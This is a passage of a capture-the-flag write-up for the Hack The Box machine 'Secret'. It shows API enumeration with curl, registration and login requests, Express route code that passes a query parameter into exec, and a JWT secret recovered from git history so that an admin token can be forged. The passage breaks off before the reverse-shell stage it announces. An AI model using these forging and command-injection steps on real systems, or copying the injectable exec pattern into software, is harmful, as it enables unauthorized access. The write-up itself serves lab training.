+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">400</span> <span style="color:#960050;background-color:#1e0010">Bad</span> <span style="color:#960050;background-color:#1e0010">Request</span>
+<span style="color:#960050;background-color:#1e0010">Server:</span> <span style="color:#960050;background-color:#1e0010">nginx/</span><span style="color:#ae81ff">1.18</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">(Ubuntu)</span>
+<span style="color:#960050;background-color:#1e0010">Date:</span> <span style="color:#960050;background-color:#1e0010">Wed,</span> <span style="color:#ae81ff">19</span> <span style="color:#960050;background-color:#1e0010">Jan</span> <span style="color:#ae81ff">2022</span> <span style="color:#ae81ff">15</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">09</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span> <span style="color:#960050;background-color:#1e0010">GMT</span>
+<span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">text/html;</span> <span style="color:#960050;background-color:#1e0010">charset=utf</span><span style="color:#ae81ff">-8</span>
+<span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">19</span>
+<span style="color:#960050;background-color:#1e0010">Connection:</span> <span style="color:#960050;background-color:#1e0010">close</span>
+<span style="color:#960050;background-color:#1e0010">X-Powered-By:</span> <span style="color:#960050;background-color:#1e0010">Express</span>
+<span style="color:#960050;background-color:#1e0010">ETag:</span> <span style="color:#960050;background-color:#1e0010">W/</span><span style="color:#e6db74">&#34;13-Q2T0jisz/unr9MyMuXKKCS2zU1g&#34;</span>
+
+<span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#960050;background-color:#1e0010">is</span> <span style="color:#960050;background-color:#1e0010">required</span>
+</code></pre></div><p>And cURL approach as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ curl -i -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -v 10.10.11.120/api/user/register --data <span style="color:#e6db74">&#39;{&#34;name&#34;: &#34;legiahuyy&#34;}&#39;</span> 
+
+*   Trying 10.10.11.120:80...
+* Connected to 10.10.11.120 <span style="color:#f92672">(</span>10.10.11.120<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+&gt; POST /api/user/register HTTP/1.1
+&gt; Host: 10.10.11.120
+&gt; User-Agent: curl/7.79.1
+&gt; Accept: */*
+&gt; Content-Type: application/json
+&gt; Content-Length: <span style="color:#ae81ff">19</span>
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+&lt; Server: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Server: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+&lt; Date: Wed, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2022</span> 15:23:38 GMT
+Date: Wed, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2022</span> 15:23:38 GMT
+&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+&lt; Content-Length: <span style="color:#ae81ff">18</span>
+Content-Length: <span style="color:#ae81ff">18</span>
+&lt; Connection: keep-alive
+Connection: keep-alive
+&lt; X-Powered-By: Express
+X-Powered-By: Express
+&lt; ETag: W/<span style="color:#e6db74">&#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&#34;</span>
+ETag: W/<span style="color:#e6db74">&#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&#34;</span>
+
+&lt; 
+* Connection <span style="color:#75715e">#0 to host 10.10.11.120 left intact</span>
+<span style="color:#e6db74">&#34;email&#34;</span> is required                                                                      
+</code></pre></div><p>Evidently, <code>/api/user/register</code> is a valid API endpoint and thus enables us to register a new user. Next, we want access to the two <code>/api/priv</code> and <code>/api/logs</code> route and it is feasible by modifying our user to <code>theadmin</code> as in <code>private.js</code>. Have a try spotting the vulnerable function in this code snippet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>).<span style="color:#a6e22e">Router</span>();
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">verifytoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./verifytoken&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">User</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../model/user&#39;</span>);
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/priv&#39;</span>, <span style="color:#a6e22e">verifytoken</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+   <span style="color:#75715e">// res.send(req.user)
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userinfo</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span> }
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>;
+    
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;theadmin&#39;</span>){
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+            <span style="color:#a6e22e">creds</span><span style="color:#f92672">:</span>{
+                <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>, 
+                <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;theadmin&#34;</span>,
+                <span style="color:#a6e22e">desc</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;welcome back admin,&#34;</span>
+            }
+        })
+    }
+    <span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+            <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> {
+                <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;you are normal user&#34;</span>,
+                <span style="color:#a6e22e">desc</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>
+            }
+        })
+    }
+})
+
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/logs&#39;</span>, <span style="color:#a6e22e">verifytoken</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">file</span>;
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userinfo</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span> }
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>;
+    
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;theadmin&#39;</span>){
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getLogs</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`git log --oneline </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">file</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+        <span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">getLogs</span>, (<span style="color:#a6e22e">err</span> , <span style="color:#a6e22e">output</span>) =&gt;{
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">err</span>);
+                <span style="color:#66d9ef">return</span>
+            }
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">output</span>);
+        })
+    }
+    <span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+            <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> {
+                <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;you are normal user&#34;</span>,
+                <span style="color:#a6e22e">desc</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>
+            }
+        })
+    }
+})
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">use</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+        <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> {
+
+            <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;404 page not found&#34;</span>,
+            <span style="color:#a6e22e">desc</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;page you are looking for is not found. &#34;</span>
+        }
+    })
+});
+
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>
+</code></pre></div><p>In order to impersonate a privileged account, we have to know the aforementioned JWT secret key. Hence, our objectives:</p>
+<ul>
+<li>Register a new user credentials</li>
+<li>Use the secret key to impersonate <code>theadmin</code> then access <code>/logs</code></li>
+<li>Abuse <code>exec</code> and spawn a reverse shell</li>
+<li>Leverage to <code>root</code> and read the flag file</li>
+</ul>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="stage-1-commits-history-and-jwt-secret-key">Stage 1: Commits history and JWT secret key<a href="#stage-1-commits-history-and-jwt-secret-key" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Since we have already known that <code>/api/user/register</code> allows us to register any users as long as they are not duplicated, so let us send a POST request but this time, our request body must meet the required fields which consists of <code>email</code>, <code>name</code> and <code>password</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">// Request
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#a6e22e">POST</span> /api/user/register <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.120</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+If-None-Match<span style="color:#f92672">:</span> <span style="color:#ae81ff">W/&#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&#34;</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">88</span>
+
+{
+<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;legiahuyy&#34;</span>,
+<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;legiahuyy@email.com&#34;</span>,
+<span style="color:#f92672">&#34;password&#34;</span>:  <span style="color:#e6db74">&#34;legiahuyy&#34;</span>
+}
+
+<span style="color:#75715e">// Expected response
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
+<span style="color:#960050;background-color:#1e0010">Server:</span> <span style="color:#960050;background-color:#1e0010">nginx/</span><span style="color:#ae81ff">1.18</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">(Ubuntu)</span>
+<span style="color:#960050;background-color:#1e0010">Date:</span> <span style="color:#960050;background-color:#1e0010">Sat,</span> <span style="color:#ae81ff">22</span> <span style="color:#960050;background-color:#1e0010">Jan</span> <span style="color:#ae81ff">2022</span> <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">27</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">17</span> <span style="color:#960050;background-color:#1e0010">GMT</span>
+<span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json;</span> <span style="color:#960050;background-color:#1e0010">charset=utf</span><span style="color:#ae81ff">-8</span>
+<span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">20</span>
+<span style="color:#960050;background-color:#1e0010">Connection:</span> <span style="color:#960050;background-color:#1e0010">close</span>
+<span style="color:#960050;background-color:#1e0010">X-Powered-By:</span> <span style="color:#960050;background-color:#1e0010">Express</span>
+<span style="color:#960050;background-color:#1e0010">ETag:</span> <span style="color:#960050;background-color:#1e0010">W/</span><span style="color:#e6db74">&#34;14-5u6aWsQRyEf6xmQ3npU9EV403v8&#34;</span>
+
+{<span style="color:#f92672">&#34;user&#34;</span>:<span style="color:#e6db74">&#34;legiahuyy&#34;</span>}
+</code></pre></div><p>Then we do the same to <code>/api/user/login</code> and feed it with the new credentials</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /api/user/login <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.120</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+If-None-Match<span style="color:#f92672">:</span> <span style="color:#ae81ff">W/&#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&#34;</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">63</span>
+
+{
+<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;legiahuyy@email.com&#34;</span>,
+<span style="color:#f92672">&#34;password&#34;</span>:  <span style="color:#e6db74">&#34;legiahuyy&#34;</span>
+}
+</code></pre></div><p>and the server responses with a JWT string representing our user - <code>legiahuyy</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
+Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sat, 22 Jan 2022 11:05:07 GMT</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">Express</span>
+auth-token<span style="color:#f92672">:</span> <span style="color:#ae81ff">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQiLCJuYW1lIjoibGVnaWFodXl5IiwiZW1haWwiOiJsZWdpYWh1eXlAZW1haWwuY29tIiwiaWF0IjoxNjQyODQ5NTA3fQ.w2orsI3BE8gax-Ik167u_YhAOv4kwuSa-qDuqukEPvE</span>
+ETag<span style="color:#f92672">:</span> <span style="color:#ae81ff">W/&#34;d7-wPhrTaCyHGE5zjXsMLs2pDjBFNk&#34;</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">215</span>
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQiLCJuYW1lIjoibGVnaWFodXl5IiwiZW1haWwiOiJsZWdpYWh1eXlAZW1haWwuY29tIiwiaWF0IjoxNjQyODQ5NTA3fQ.w2orsI3BE8gax-Ik167u_YhAOv4kwuSa-qDuqukEPvE
+</code></pre></div><p>A seemingly futile attempt was made to access <code>/api/priv</code> with the current token and yielded expected response informing our user does not have the specified role. Considering the following two code portions as they verify and grant us access to restricted endpoints, respectively:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// verifytoken.js
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jwt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;jsonwebtoken&#34;</span>);
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;auth-token&#34;</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">token</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Access Denied&#34;</span>);
+
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">verified</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">TOKEN_SECRET</span>);
+        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">verified</span>;
+        <span style="color:#a6e22e">next</span>();
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Invalid Token&#34;</span>);
+    }
+};
+
+<span style="color:#75715e">// private.js
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">// /api/priv route:
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userinfo</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span> }
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>;
+    
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;theadmin&#39;</span>){
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+            <span style="color:#a6e22e">creds</span><span style="color:#f92672">:</span>{
+                <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>, 
+                <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;theadmin&#34;</span>,
+                <span style="color:#a6e22e">desc</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;welcome back admin,&#34;</span>
+            }
+        })
+    }
+...
+<span style="color:#75715e">// /api/logs route:
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;theadmin&#39;</span>){
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getLogs</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`git log --oneline </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">file</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+        <span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">getLogs</span>, (<span style="color:#a6e22e">err</span> , <span style="color:#a6e22e">output</span>) =&gt;{
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">err</span>);
+                <span style="color:#66d9ef">return</span>
+            }
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">output</span>);
+        })
+    }
+...
+</code></pre></div><p>As the above snippet suggested, <code>auth-token</code> in our header request with its <code>TOKEN_SECRET</code> are to be verified, the request is then passed to <code>/api/priv</code> or <code>/api/logs</code> for a username comparison and we therefrom have access to the protected resources which are required for the later stage.</p>
+<p>Usually, when dealing with JWT, one of my favorites is <a href="https://JWT.io">JWT.io</a> because of its straightforward and friendly design but you can always have an alternative <a href="https://github.com/ticarpi/jwt_tool">CLI option</a> in case internet is not available or whatever your reason is. Anyway, we are going with the web version and conveniently paste the received token there.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-22_21-35.png" alt=""></p>
+<p>In the previous enumeration step, we have known <code>.env</code> is from which to look for the secret key. Ergo, we can easily snatch it from the file yet that was just what I thought and consequently, it did take a plenty of time for me to figure out where the <em>original</em> one is. Try having a guess before you carry on to the solution.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-25_09-49.png" alt=""></p>
+<p>And I expect you still remember the extracting process with GitTools in our initial enumeration as it now provides the original <code>TOKEN_SECRET</code>. With that in mind, let us skim through the dumped contents.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ ls -l ./www/extracted 
+total <span style="color:#ae81ff">24</span>
+drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:55 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:56 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
+drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:57 2-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:58 3-de0a46b5107a2f4d26e348303e76d85ae4870934
+drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:59 4-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
+drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 22:00 5-3a367e735ee76569664bf7754eaaade7c735d702
+
+┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ cd ./www/extracted/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb     
+
+┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/Secret/www/extracted/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb<span style="color:#f92672">]</span>
+└─$ cat .env                                                      
+DB_CONNECT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
+TOKEN_SECRET <span style="color:#f92672">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+</code></pre></div><p>Thanks to this, we now have the correct token to impersonate <code>theadmin</code>. As I have mentioned earlier, it is only necessary to modify <code>&quot;name&quot;</code>.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-26_16-05.png" alt=""></p>
+<p>We then can send a request to the <code>/api/priv</code> endpoint to test out the newly forged token using Burpsuite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">// Request
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#a6e22e">GET</span> /api/priv <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.120</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
